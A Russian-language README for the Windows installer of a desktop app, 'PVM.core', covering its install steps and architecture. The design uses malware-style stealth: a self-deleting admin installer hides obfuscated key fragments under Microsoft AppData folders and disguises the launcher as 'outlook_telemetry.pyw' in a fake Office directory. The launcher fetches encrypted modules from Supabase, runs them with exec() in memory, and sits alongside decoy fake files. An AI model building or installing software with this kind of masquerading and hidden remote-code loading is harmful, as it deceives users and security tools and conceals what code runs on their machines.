# PVM.core — Windows Installer (Original Desktop Version)

## Состав папки

| Файл | Назначение |
|---|---|
| `SystemConfig.bat` | Установщик — запустить от имени администратора |
| `Uninstall.bat` | Удаление всех компонентов |
| `install.py` | Python-скрипт: создаёт фрагменты и генерирует лаунчер |
| `app.ico` | Иконка для ярлыка на рабочем столе |

## Установка

1. Запустите `SystemConfig.bat` **от имени администратора** (правый клик → "Запуск от имени администратора")
2. Установщик автоматически:
   - Проверит/установит Microsoft Visual C++ Redistributable
   - Найдёт или скачает Python 3.12+
   - Установит зависимости: `pip install requests pandas supabase playwright openpyxl pystray Pillow cryptography tkcalendar`
   - Установит браузер: `playwright install chromium`
   - Запустит `install.py` — генерацию скрытых компонентов
   - Создаст ярлык `PVM.core.lnk` на рабочем столе
   - Выполнит smoke-тест и запустит программу
3. Файлы `SystemConfig.bat`, `install.py`, `app.ico` самоудаляются после успешной установки

## Удаление

Запустите `Uninstall.bat` — он удалит все фрагменты, ключи, БД, кеш, ярлык и автозагрузку.

## Архитектура установки

```
SystemConfig.bat (администратор)
  ├── Устанавливает Python 3.12+ (если отсутствует)
  ├── pip install — основные пакеты
  ├── playwright install chromium
  ├── Запускает install.py
  │     ├── Создаёт 12+ фрагментов в AppData\Local\Microsoft\... (XOR/Caesar)
  │     ├── Создаёт device.key, settings.json, progress.json
  │     ├── Создаёт Fernet-ключ для шифрования модулей
  │     ├── Создаёт index.bin (зашифрованный список фрагментов)
  │     └── Генерирует лаунчер outlook_telemetry.pyw
  │         в %LOCALAPPDATA%\Microsoft\Office\SmartBridge\
  ├── Создаёт ярлык PVM.core.lnk → pythonw outlook_telemetry.pyw
  ├── Smoke-тест (PVM_DEBUG=1)
  └── Самоудаляется

outlook_telemetry.pyw (лаунчер)
  ├── Загружает и дешифрует фрагменты → URL + API ключ
  ├── Скачивает модули из Supabase проверяя SHA256
  ├── Дешифрует через Fernet → exec() в памяти
  └── Запускает code.py → GreenLeafApp (Tkinter UI)

Пользовательские данные:
  %LOCALAPPDATA%\Microsoft\Office\SmartBridge\
    ├── cache\pvmcore.db    — SQLite БД
    ├── cache\device.key    — ключ устройства
    ├── cache\settings.json — настройки
    └── cache\pvm.log       — логи

  %LOCALAPPDATA%\PVMGroup\PVM.core\  — decoy (фейковые файлы)
```
